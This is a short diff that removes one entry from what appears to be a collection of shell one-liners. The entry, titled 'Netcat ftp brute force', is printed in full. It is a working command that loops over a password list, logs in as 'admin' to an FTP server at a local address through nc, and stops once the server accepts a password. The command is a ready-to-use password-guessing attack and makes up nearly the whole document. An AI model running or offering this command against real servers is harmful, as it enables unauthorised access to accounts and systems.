@@ -1,8 +1,0 @@
-commandlinefu_id: 5512
-translator:
-  weibo: ''
-hide: true
-command: |-
-  cat list|while read lines;do echo "USER admin">ftp;echo "PASS $lines">>ftp;echo "QUIT">>ftp;nc 192.168.77.128 21 <ftp>ftp2;echo "trying: $lines";cat ftp2|grep "230">/dev/null;[ "$?" -eq "0" ]&& echo "pass: $lines" && break;done
-summary: |-
-  Netcat ftp brute force
